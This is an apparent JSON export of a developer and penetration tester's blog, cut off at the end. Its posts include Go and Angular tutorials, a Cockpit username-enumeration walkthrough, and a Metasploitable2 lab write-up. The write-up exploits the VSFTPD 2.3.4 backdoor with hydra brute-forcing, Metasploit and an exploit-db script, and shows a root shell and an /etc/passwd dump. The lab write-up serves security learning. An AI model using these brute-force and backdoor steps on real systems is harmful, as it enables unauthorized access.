{"meta":{"title":"congdong007","subtitle":"Penetration Test、Software Developer","description":"Python、Typescript、Go、C/C++、asm、Bash","author":"Dong Cong","url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2023-10-16T16:11:55.341Z","updated":"2023-10-16T16:11:55.341Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""},{"title":"tags","date":"2023-10-15T00:30:44.000Z","updated":"2023-10-16T14:06:43.380Z","comments":false,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"The Cockpit system has an arbitrary user enumeration vulnerability","slug":"cockpit-vuln","date":"2024-11-11T03:37:33.000Z","updated":"2024-11-11T14:14:50.196Z","comments":true,"path":"2024/11/10/cockpit-vuln/","link":"","permalink":"http://example.com/2024/11/10/cockpit-vuln/","excerpt":"","text":"Using Burp Suite’s browser, open the URL: https://192.168.1.10/auth/forgotpassword. Burp Suite will capture the request packet. Click the “Forward” button, and the screen should look like this: Next, enter a username, such as admin, and click the “RESET” button. Burp Suite will capture another packet, which can be sent to the Repeater. It should appear as follows: Click the “Send” button in Burp Suite’s Repeater, and you’ll see the response: The response shows the following error message: 123&#123; &quot;error&quot;:&quot;Invalid address: (from) root@localhost&quot;&#125; This indicates that the username admin exists. However, if you input a username that doesn’t exist, you’ll see the following response: 123&#123; &quot;error&quot;:&quot;User does not exist&quot;&#125; In Burp Suite’s Repeater, the response appears as follows: From this, we can deduce that the user admin exists, while admin11111 does not. Using Burp Suite’s Intruder, we can attempt to enumerate other usernames. The results show that the following usernames exist: 1234adminchenmaxuser","categories":[{"name":"vulnerability","slug":"vulnerability","permalink":"http://example.com/categories/vulnerability/"},{"name":"Cockpit","slug":"vulnerability/Cockpit","permalink":"http://example.com/categories/vulnerability/Cockpit/"}],"tags":[{"name":"Burp Suite","slug":"Burp-Suite","permalink":"http://example.com/tags/Burp-Suite/"},{"name":"user enumeration vulnerability","slug":"user-enumeration-vulnerability","permalink":"http://example.com/tags/user-enumeration-vulnerability/"}]},{"title":"Angular from Beginner to Hero (1) -- Setting up the Local Environment and Workspace","slug":"angular-start","date":"2022-06-19T01:07:20.000Z","updated":"2023-10-19T20:31:51.209Z","comments":true,"path":"2022/06/18/angular-start/","link":"","permalink":"http://example.com/2022/06/18/angular-start/","excerpt":"","text":"Prerequisites To use the Angular framework, you should be familiar with the following: – JavaScript – HTML – CSS Knowledge of TypeScript is helpful, but not required. To install Angular on your local system, you need the following: Node.js:Angular requires an active LTS or maintenance LTS version of Node.js.Here’s the newest version in nodejs.org&#x2F;en:If you are unsure what version of Node.js runs on your system, run node -v in a terminal window.12node -vv16.17.1 npm Package Manager:Angular, the Angular CLI, and Angular applications depend on npm packages for many features and functions. To download and install npm packages, you need an npm package manager. This guide uses the npm client command line interface, which is installed with Node.js by default. To check that you have the npm client installed, run npm -v in a terminal window. Install the Angular CLI To install the Angular CLI, open a terminal window and run the following command: 1npm install -g @angular/cli Create a workspace and initial application You develop apps in the context of an Angular workspace. To create a new workspace and initial starter app: 1. Run the CLI command ng new and provide the name my-app, as shown here: 1ng new my-app 2. The ng new command prompts you for information about features to include in the initial app. Accept the defaults by pressing the Enter or Return key. The Angular CLI installs the necessary Angular npm packages and other dependencies. This can take a few minutes. The CLI creates a new workspace and a simple Welcome app, ready to run. Run the application The Angular CLI includes a server, for you to build and serve your app locally. Navigate to the workspace folder, such as my-app. Run the following command: 12cd my-appng serve --open The ng serve command launches the server, watches your files, and rebuilds the app as you make changes to those files. The –open (or just -o) option automatically opens your browser to http://localhost:4200/. If your installation and setup was successful, you should see a page similar to the following. Compile and Package Angular CLI also provides commands: 1ng build --prod Among them, the parameter –prod tells the compilation environment to compile for the production environment package. Similarly, in the ‘angular.json’ file, default compilation parameters are defined, and if necessary, they can be modified. The main configuration parameters are as follows. 123456789101112131415&quot;configurations&quot;: &#123; ... &quot;budgets&quot;: [ &#123; &quot;type&quot;: &quot;initial&quot;, &quot;maximumWarning&quot;: &quot;5mb&quot;, &quot;maximumError&quot;: &quot;10mb&quot; &#125;, &#123; &quot;type&quot;: &quot;anyComponentStyle&quot;, &quot;maximumWarning&quot;: &quot;1mb&quot;, &quot;maximumError&quot;: &quot;4mb&quot; &#125; ],&#125; Angular, by default, compiles to the ‘dist’ directory under the root directory, generating pure static files (html, css, js), as well as image files. Deploy to a Server Using the “phpStudy” tool, go into its root directory, which is usually something like “C:\\phpStudy\\PHPTutorial\\WWW.” Copy all the files from the ‘dist’ directory to the root directory “C:\\phpStudy\\PHPTutorial\\WWW.” Restart phpStudy’s services to make sure the changes take effect. Open your Chrome browser, and you should be able to access the website by entering the following URL in the address bar: http://localhost/index.html Make sure you have the correct directory paths, and that the files from the ‘dist’ directory are copied over to the correct location in the root directory. Additionally, ensure that the web server and PHP services in phpStudy are correctly configured and running.","categories":[{"name":"Angular from Beginner to Hero","slug":"Angular-from-Beginner-to-Hero","permalink":"http://example.com/categories/Angular-from-Beginner-to-Hero/"},{"name":"(1) Setting up the Local Environment and Workspace","slug":"Angular-from-Beginner-to-Hero/1-Setting-up-the-Local-Environment-and-Workspace","permalink":"http://example.com/categories/Angular-from-Beginner-to-Hero/1-Setting-up-the-Local-Environment-and-Workspace/"}],"tags":[]},{"title":"VSFTPD 2.3.4 exploit","slug":"VSFTPD2-3-4pentest","date":"2021-03-06T02:42:06.000Z","updated":"2024-01-05T22:20:45.004Z","comments":true,"path":"2021/03/05/VSFTPD2-3-4pentest/","link":"","permalink":"http://example.com/2021/03/05/VSFTPD2-3-4pentest/","excerpt":"","text":"[metasploitable - linux] VSFTPD 2.3.4 exploit with hydra,metasploit,python POC Network Scan 123456789101112131415161718192021222324┌──(root㉿kali)-[/home/kali/Desktop/cd]└─# nmap -A -sV 192.168.244.136Starting Nmap 7.94 ( https://nmap.org ) at 2024-01-05 15:58 ESTNmap scan report for 192.168.244.136 (192.168.244.136)Host is up (0.00064s latency).Not shown: 977 closed tcp ports (reset)PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 2.3.4|_ftp-anon: Anonymous FTP login allowed (FTP code 230)| ftp-syst: | STAT: | FTP server status:| Connected to 192.168.244.140| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| vsFTPd 2.3.4 - secure, fast, stable|_End of status VSFTPD 2.3.4 exploit with hydra First , we need construct dictionaries about username and passwordhere’s the dictionaries which usernames named usernames.txt and passwords named passwords.txt then , we use the tools hydra with the follow command line: 1hydra -L /home/kali/Desktop/cd/mywordlists/usernames.txt -P /home/kali/Desktop/cd/mywordlists/passwords.txt 192.168.244.136 ftp -V here’s the command line ouput looks like: 1234567891011121314151617181920212223242526272829303132333435Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-01-26 16:20:39[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task[DATA] attacking ftp://192.168.244.136:21/[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;admin&quot; - 1 of 25 [child 0] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;msfadmin&quot; - 2 of 25 [child 1] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;root&quot; - 3 of 25 [child 2] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;user&quot; - 4 of 25 [child 3] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;admin&quot; - pass &quot;&quot; - 5 of 25 [child 4] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;admin&quot; - 6 of 25 [child 5] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;msfadmin&quot; - 7 of 25 [child 6] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;root&quot; - 8 of 25 [child 7] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;user&quot; - 9 of 25 [child 8] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;msfadmin&quot; - pass &quot;&quot; - 10 of 25 [child 9] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;admin&quot; - 11 of 25 [child 10] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;msfadmin&quot; - 12 of 25 [child 11] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;root&quot; - 13 of 25 [child 12] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;user&quot; - 14 of 25 [child 13] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;root&quot; - pass &quot;&quot; - 15 of 25 [child 14] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;admin&quot; - 16 of 25 [child 15] (0/0)[21][ftp] host: 192.168.244.136 login: msfadmin password: msfadmin[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;msfadmin&quot; - 17 of 25 [child 6] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;root&quot; - 18 of 25 [child 5] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;user&quot; - 19 of 25 [child 7] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;user&quot; - pass &quot;&quot; - 20 of 25 [child 8] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;admin&quot; - 21 of 25 [child 9] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;msfadmin&quot; - 22 of 25 [child 0] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;root&quot; - 23 of 25 [child 1] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;user&quot; - 24 of 25 [child 2] (0/0)[ATTEMPT] target 192.168.244.136 - login &quot;&quot; - pass &quot;&quot; - 25 of 25 [child 4] (0/0)[21][ftp] host: 192.168.244.136 login: user password: user1 of 1 target successfully completed, 2 valid passwords foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-03-05 21:20:47 here, we found two users we could use to login the ftp server: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748ftp 192.168.244.136Connected to 192.168.244.136.220 (vsFTPd 2.3.4)Name (192.168.244.136:kali): msfadmin331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||54670|).150 Here comes the directory listing.-rw-r--r-- 1 1000 1000 0 Oct 21 21:49 gordon.txt-rw-r--r-- 1 1000 1000 29 Oct 30 23:31 myfile.log-rw-r--r-- 1 1000 1000 914 Oct 21 14:59 nmap-list.txtdrwxr-xr-x 6 1000 1000 4096 Apr 28 2010 vulnerable226 Directory send OK.ftp&gt; cd /250 Directory successfully changed.ftp&gt; pwdRemote directory: /ftp&gt; ls229 Entering Extended Passive Mode (|||54956|).150 Here comes the directory listing.drwxr-xr-x 2 0 0 4096 May 14 2012 bindrwxr-xr-x 4 0 0 1024 May 14 2012 bootlrwxrwxrwx 1 0 0 11 Apr 28 2010 cdrom -&gt; media/cdromdrwxr-xr-x 13 0 0 13860 Jan 05 20:57 devdrwxr-xr-x 94 0 0 4096 Jan 05 21:21 etcdrwxr-xr-x 6 0 0 4096 Apr 16 2010 homedrwxr-xr-x 2 0 0 4096 Mar 16 2010 initrdlrwxrwxrwx 1 0 0 32 Apr 28 2010 initrd.img -&gt; boot/initrd.img-2.6.24-16-serverdrwxr-xr-x 13 0 0 4096 May 14 2012 libdrwx------ 2 0 0 16384 Mar 16 2010 lost+founddrwxr-xr-x 4 0 0 4096 Mar 16 2010 mediadrwxr-xr-x 3 0 0 4096 Apr 28 2010 mnt-rw------- 1 0 0 57012 Jan 05 20:54 nohup.outdrwxr-xr-x 2 0 0 4096 Mar 16 2010 optdr-xr-xr-x 118 0 0 0 Jan 05 20:54 procdrwxr-xr-x 13 0 0 4096 Jan 05 20:54 rootdrwxr-xr-x 2 0 0 4096 May 14 2012 sbindrwxr-xr-x 2 0 0 4096 Mar 16 2010 srvdrwxr-xr-x 12 0 0 0 Jan 05 20:54 sysdrwxrwxrwt 5 0 0 4096 Jan 05 20:59 tmpdrwxr-xr-x 12 0 0 4096 Apr 28 2010 usrdrwxr-xr-x 14 0 0 4096 Mar 17 2010 varlrwxrwxrwx 1 0 0 29 Apr 28 2010 vmlinuz -&gt; boot/vmlinuz-2.6.24-16-server226 Directory send OK. VSFTPD 2.3.4 exploit with metasploit: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889msf6 &gt; search vsftpdMatching Modules================ # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 auxiliary/dos/ftp/vsftpd_232 2011-02-03 normal Yes VSFTPD 2.3.2 Denial of Service 1 exploit/unix/ftp/vsftpd_234_backdoor 2011-07-03 excellent No VSFTPD v2.3.4 Backdoor Command ExecutionInteract with a module by name or index. For example info 1, use 1 or use exploit/unix/ftp/vsftpd_234_backdoormsf6 &gt; use 1[*] No payload configured, defaulting to cmd/unix/interactmsf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; show info Name: VSFTPD v2.3.4 Backdoor Command Execution Module: exploit/unix/ftp/vsftpd_234_backdoor Platform: Unix Arch: cmd Privileged: Yes License: Metasploit Framework License (BSD) Rank: Excellent Disclosed: 2011-07-03Provided by: hdm &lt;x@hdm.io&gt; MC &lt;mc@metasploit.com&gt;Available targets: Id Name -- ---- =&gt; 0 AutomaticCheck supported: NoBasic options: Name Current Setting Required Description ---- --------------- -------- ----------- RHOSTS yes The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html RPORT 21 yes The target port (TCP)Payload information: Space: 2000 Avoid: 0 charactersDescription: This module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011.References: OSVDB (73573) http://pastebin.com/AetT9sS5 http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.htmlView the full module info with the info -d command.msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; set rhosts 192.168.244.136rhosts =&gt; 192.168.244.136msf6 exploit(unix/ftp/vsftpd_234_backdoor) &gt; run[*] 192.168.244.136:21 - Banner: 220 (vsFTPd 2.3.4)[*] 192.168.244.136:21 - USER: 331 Please specify the password.[+] 192.168.244.136:21 - Backdoor service has been spawned, handling...[+] 192.168.244.136:21 - UID: uid=0(root) gid=0(root)[*] Found shell.id[*] Command shell session 1 opened (192.168.244.140:41279 -&gt; 192.168.244.136:6200) at 2024-01-05 16:46:43 -0500uid=0(root) gid=0(root)ip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000 link/ether 00:0c:29:d5:0c:8b brd ff:ff:ff:ff:ff:ff inet 192.168.244.136/24 brd 192.168.244.255 scope global eth0 inet6 fe80::20c:29ff:fed5:c8b/64 scope link valid_lft forever preferred_lft forever3: eth1: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop qlen 1000 link/ether 00:0c:29:d5:0c:95 brd ff:ff:ff:ff:ff:ff VSFTPD 2.3.4 exploit with python POC: First, we should search the valid POC from kali’s exploit db with follow command line: 12345678910111213141516┌──(root㉿kali)-[/home/kali/Desktop/cd]└─# searchsploit -t vsftpd ---------------------------------------------------------------------------------------------------------- Exploit Title | Path----------------------------------------------------------------------------------------------------------vsftpd 2.0.5 - &#x27;CWD&#x27; (Authenticated) Remote Memory Consumption | linux/dos/5814.plvsftpd 2.0.5 - &#x27;deny_file&#x27; Option Remote Denial of Service (1) | windows/dos/31818.shvsftpd 2.0.5 - &#x27;deny_file&#x27; Option Remote Denial of Service (2) | windows/dos/31819.plvsftpd 2.3.2 - Denial of | linux/dos/16270.cvsftpd 2.3.4 - Backdoor Command Execution | unix/remote/49757.pyvsftpd 2.3.4 - Backdoor Command Execution (Metasploit) | unix/remote/17491.rbvsftpd 3.0.3 - Remote Denial of Service | multiple/remote/49719.py------------------------------------------------------------------------------------------------------------Shellcodes: No ResultsPapers: No Results Next, we copy the valid POC to current work directory, and try to exploit , the follow shows the exploit process: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101┌──(root㉿kali)-[/home/kali/Desktop/cd]└─# searchsploit -m unix/remote/49757.py Exploit: vsftpd 2.3.4 - Backdoor Command Execution URL: https://www.exploit-db.com/exploits/49757 Path: /usr/share/exploitdb/exploits/unix/remote/49757.py Codes: CVE-2011-2523 Verified: TrueFile Type: Python script, ASCII text executablecp: overwrite &#x27;/home/kali/Desktop/cd/49757.py&#x27;? yesCopied to: /home/kali/Desktop/cd/49757.py ┌──(root㉿kali)-[/home/kali/Desktop/cd]└─# chmod +x 49757.py ┌──(root㉿kali)-[/home/kali/Desktop/cd]└─# ls 49757.py wordlists ┌──(root㉿kali)-[/home/kali/Desktop/cd]└─# python ./49757.py 192.168.244.136 Success, shell openedSend `exit` to quit shellip addr1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo inet6 ::1/128 scope host valid_lft forever preferred_lft forever2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000 link/ether 00:0c:29:d5:0c:8b brd ff:ff:ff:ff:ff:ff inet 192.168.244.136/24 brd 192.168.244.255 scope global eth0 inet6 fe80::20c:29ff:fed5:c8b/64 scope link valid_lft forever preferred_lft forever3: eth1: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop qlen 1000 link/ether 00:0c:29:d5:0c:95 brd ff:ff:ff:ff:ff:ffpwd/lsbinbootcdromdevetchomeinitrdinitrd.imgliblost+foundmediamntnohup.outoptprocrootsbinsrvsystmpusrvarvmlinuzcat /etc/passwdroot:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/bin/shbin:x:2:2:bin:/bin:/bin/shsys:x:3:3:sys:/dev:/bin/shsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/bin/shman:x:6:12:man:/var/cache/man:/bin/shlp:x:7:7:lp:/var/spool/lpd:/bin/shmail:x:8:8:mail:/var/mail:/bin/shnews:x:9:9:news:/var/spool/news:/bin/shuucp:x:10:10:uucp:/var/spool/uucp:/bin/shproxy:x:13:13:proxy:/bin:/bin/shwww-data:x:33:33:www-data:/var/www:/bin/shbackup:x:34:34:backup:/var/backups:/bin/shlist:x:38:38:Mailing List Manager:/var/list:/bin/shirc:x:39:39:ircd:/var/run/ircd:/bin/shgnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/shnobody:x:65534:65534:nobody:/nonexistent:/bin/shlibuuid:x:100:101::/var/lib/libuuid:/bin/shdhcp:x:101:102::/nonexistent:/bin/falsesyslog:x:102:103::/home/syslog:/bin/falseklog:x:103:104::/home/klog:/bin/falsesshd:x:104:65534::/var/run/sshd:/usr/sbin/nologinmsfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bashbind:x:105:113::/var/cache/bind:/bin/falsepostfix:x:106:115::/var/spool/postfix:/bin/falseftp:x:107:65534::/home/ftp:/bin/falsepostgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bashmysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/falsetomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/falsedistccd:x:111:65534::/:/bin/falseuser:x:1001:1001:just a user,111,,:/home/user:/bin/bashservice:x:1002:1002:,,,:/home/service:/bin/bashtelnetd:x:112:120::/nonexistent:/bin/falseproftpd:x:113:65534::/var/run/proftpd:/bin/falsestatd:x:114:65534::/var/lib/nfs:/bin/false","categories":[{"name":"Penetration Test","slug":"Penetration-Test","permalink":"http://example.com/categories/Penetration-Test/"},{"name":"metasploitable2","slug":"Penetration-Test/metasploitable2","permalink":"http://example.com/categories/Penetration-Test/metasploitable2/"},{"name":"linux","slug":"Penetration-Test/metasploitable2/linux","permalink":"http://example.com/categories/Penetration-Test/metasploitable2/linux/"},{"name":"VSFTPD 2.3.4 exploit","slug":"Penetration-Test/metasploitable2/linux/VSFTPD-2-3-4-exploit","permalink":"http://example.com/categories/Penetration-Test/metasploitable2/linux/VSFTPD-2-3-4-exploit/"}],"tags":[]},{"title":"About File Testing in the Go Language.","slug":"goAboutUnitTest","date":"2019-02-13T01:59:33.000Z","updated":"2023-10-17T16:31:11.713Z","comments":true,"path":"2019/02/12/goAboutUnitTest/","link":"","permalink":"http://example.com/2019/02/12/goAboutUnitTest/","excerpt":"","text":"To test a Go file, you typically need to create a test file in the same directory as the file you’re testing and write your test code within it. Here’s an example: you have a file named math.go containing a simple mathematical function ‘Add.’ Then, you will create a test file named math_test.go to test this function. Assuming the math.go file is as follows: 1234567// math.gopackage mainfunc Add(a, b int) int &#123; return a + b&#125; You can then create a math_test.go file to write your test code: 12345678910111213// math_test.gopackage mainimport &quot;testing&quot;func TestAdd(t *testing.T) &#123; result := Add(2, 3) expected := 5 if result != expected &#123; t.Errorf(&quot;Add(2, 3) returned %d, expected %d&quot;, result, expected) &#125;&#125; In math_test.go, we import the testing package and write a test function named TestAdd. Test functions should start with ‘Test’ and accept a *testing.T parameter, which is used to report test failures. Inside the TestAdd function, we call Add(2, 3) to execute the function being tested and compare the result to the expected value. If the result doesn’t match the expected value, we use t.Errorf to report the test failure with detailed error information. Next, you can run the tests using the ‘go test‘ command in your terminal: 1go test Go will search for all the _test.go files in the current directory and execute the test functions within them. If the tests pass, you’ll see a success message. If the tests fail, you’ll get detailed failure information. This is just a very basic example. In real-world projects, you can write more test cases to cover various scenarios and ensure that your code works correctly in different situations.”","categories":[{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"Unit Test","slug":"Go/Unit-Test","permalink":"http://example.com/categories/Go/Unit-Test/"}],"tags":[]},{"title":"nil in the Go language","slug":"goNil","date":"2019-01-04T03:59:12.000Z","updated":"2023-10-17T15:38:41.786Z","comments":true,"path":"2019/01/03/goNil/","link":"","permalink":"http://example.com/2019/01/03/goNil/","excerpt":"","text":"In the Go language, “nil“ is a special predefined value commonly used to represent zero values or missing values in certain data structures. Here are some common usages and scenarios for “nil“: Pointer and Reference Types: The most common use of “nil“ is in pointer and reference types, indicating that a pointer doesn’t point to any valid memory address or a reference doesn’t reference any object. For example, “nil“ is used in the following cases: 123var ptr *int // Declare an integer pointer, its zero value is nilvar slice []int // Declare an integer slice, its zero value is nilvar m map[string]int // Declare a map, its zero value is nil Interface Types: “nil“ can also be used with interface types, signifying that an interface has no specific implemented value. This can be useful in some cases to check if an interface is empty (uninitialized or unassigned). 12345var myInterface interface&#123;&#125;if myInterface == nil &#123; fmt.Println(&quot;The interface is empty&quot;)&#125; Function and Method Return Values: Functions and methods can return multiple values, some of which might be pointer types. In certain situations, returned pointers may be “nil,” indicating that there are no valid return values. 12345678func findValue(slice []int, target int) (*int, bool) &#123; for i, val := range slice &#123; if val == target &#123; return &amp;slice[i], true &#125; &#125; return nil, false&#125; It’s important to handle “nil“ with care to avoid runtime errors like null pointer references. It’s a good practice to check whether pointers, slices, maps, and other data structures are “nil“ before accessing them to ensure safety.","categories":[{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"nil","slug":"Go/nil","permalink":"http://example.com/categories/Go/nil/"}],"tags":[]},{"title":"panic() and recover() in the Go Language","slug":"goPanicAndRecover","date":"2018-12-31T01:48:46.000Z","updated":"2023-10-17T15:39:09.027Z","comments":true,"path":"2018/12/30/goPanicAndRecover/","link":"","permalink":"http://example.com/2018/12/30/goPanicAndRecover/","excerpt":"","text":"panic() and recover() are two important functions in the Go language for handling exceptions. Here is a simple example that demonstrates how to use panic() and recover() in Go. 1234567891011121314151617181920212223242526272829package mainimport ( &quot;fmt&quot;)// A function to simulate a situation that might cause a panicfunc doSomething() &#123; defer func() &#123; if err := recover(); err != nil &#123; fmt.Println(&quot;Panic occurred but recovered:&quot;, err) &#125; &#125;() // Simulate a problematic situation num1 := 10 num2 := 0 result := num1 / num2 // This will cause a division by zero panic fmt.Println(&quot;Result is:&quot;, result) // This won&#x27;t be printed as the panic has already occurred&#125;func main() &#123; fmt.Println(&quot;Starting the program&quot;) doSomething() fmt.Println(&quot;Program continues to execute&quot;) // Even if a panic occurs, this line will be printed because the panic has been recovered in doSomething()&#125; In the example above, the doSomething() function attempts to divide 10 by 0, which would lead to a division by zero panic. However, we use defer() and recover() to catch and handle the panic. In the main() function, even if a panic occurs within doSomething(), the program continues to execute, and the panic information is printed within the recover() block. Running this program will produce the following output: 1234Starting the programPanic occurred but recovered: runtime error: integer divide by zeroProgram continues to execute This demonstrates that the recover() function successfully catches the panic, allowing the program to continue executing without terminating.”","categories":[{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"panic() and recover()","slug":"Go/panic-and-recover","permalink":"http://example.com/categories/Go/panic-and-recover/"}],"tags":[]},{"title":"defer in the Go Language","slug":"goDefer","date":"2018-12-17T04:33:42.000Z","updated":"2023-10-17T15:38:15.816Z","comments":true,"path":"2018/12/16/goDefer/","link":"","permalink":"http://example.com/2018/12/16/goDefer/","excerpt":"","text":"In Go language, defer is a very useful keyword used for deferring the execution of functions, typically employed for performing cleanup or resource release operations before a function returns. A defer statement pushes the function call that should be deferred onto a stack and executes these deferred function calls in a last-in, first-out (LIFO) order just before the current function returns. Here are some important features and uses of defer: Deferred Execution: Using the defer keyword ensures that a function call is executed before the containing function returns, whether it returns normally or due to an error. Resource Cleanup: Common use cases include closing files, releasing locks, closing database connections, and other cleanup operations to prevent resource leaks. Parameter Evaluation: The parameters in a defer statement are evaluated when the defer statement is executed, not when the function returns. Here are some examples demonstrating the use of defer: 123456789101112131415161718192021222324252627282930313233package mainimport &quot;fmt&quot;func main() &#123; // Example 1: defer for file closing file := openFile(&quot;example.txt&quot;) defer closeFile(file) // Example 2: defer for logging function execution time defer logTime(&quot;Function execution&quot;) // Example 3: Multiple defer statements execute in a last-in, first-out order for i := 1; i &lt;= 5; i++ &#123; defer fmt.Println(&quot;Deferred statement&quot;, i) &#125; fmt.Println(&quot;Function body&quot;)&#125;func openFile(filename string) *File &#123; fmt.Println(&quot;Opening file:&quot;, filename) return // Open the file and return the file handle&#125;func closeFile(file *File) &#123; fmt.Println(&quot;Closing file&quot;) // Close the file&#125;func logTime(message string) &#123; fmt.Println(message, &quot;at some time&quot;)&#125; In the above examples, defer statements are used to ensure the file is closed before main returns, log the execution time of the function, and execute multiple defer statements in a last-in, first-out order. defer is a powerful tool in Go that can help you write safer and cleaner code, ensuring proper resource release and consistency.”","categories":[{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"defer","slug":"Go/defer","permalink":"http://example.com/categories/Go/defer/"}],"tags":[]},{"title":"Closure and Anonymous Function in Go","slug":"goAnonymousFunctionClosure","date":"2018-11-29T02:21:24.000Z","updated":"2023-10-17T15:38:03.764Z","comments":true,"path":"2018/11/28/goAnonymousFunctionClosure/","link":"","permalink":"http://example.com/2018/11/28/goAnonymousFunctionClosure/","excerpt":"","text":"In Go language, closures and anonymous functions are both forms of functions, but they have some important differences. Below, I will provide examples of the usage and differences between these two concepts: Closure Example:A closure refers to a function that captures one or more variables from its outer function scope and can be called outside of that function while still accessing these captured variables. 123456789101112131415161718192021package mainimport &quot;fmt&quot;func main() &#123; outerVar := 10 // Closure function closure := func() &#123; fmt.Println(&quot;Outer variable outerVar:&quot;, outerVar) &#125; // Call the closure function closure() // Output: Outer variable outerVar: 10 // Modify the outer variable outerVar = 20 // Call the closure function again closure() // Output: Outer variable outerVar: 20&#125; In the above example, closure is a closure that captures the outer variable outerVar and can access and modify that variable even outside the function. Anonymous Function Example: An anonymous function is a function without a name; it can be directly assigned to a variable or passed as an argument to other functions. 1234567891011121314151617181920package mainimport &quot;fmt&quot;func main() &#123; // Define and call an anonymous function result := func(x, y int) int &#123; return x + y &#125;(5, 3) fmt.Println(&quot;Result of the anonymous function:&quot;, result) // Output: Result of the anonymous function: 8 // Assign an anonymous function to a variable add := func(x, y int) int &#123; return x + y &#125; sum := add(10, 20) fmt.Println(&quot;Calling the anonymous function using a variable:&quot;, sum) // Output: Calling the anonymous function using a variable: 30&#125; In the above example, we define an anonymous function and call it directly. We also assign another anonymous function to the add variable and use that variable to call the function. To summarize the differences: A closure is a function that captures external variables and can access and modify them outside of the function.An anonymous function is a function without a name, which can be assigned to a variable or passed as an argument to other functions.It’s important to note that while closures often involve anonymous functions, not all anonymous functions are closures. A closure is a specific type of anonymous function that captures external variables.","categories":[{"name":"Go","slug":"Go","permalink":"http://example.com/categories/Go/"},{"name":"Closure and Anonymous 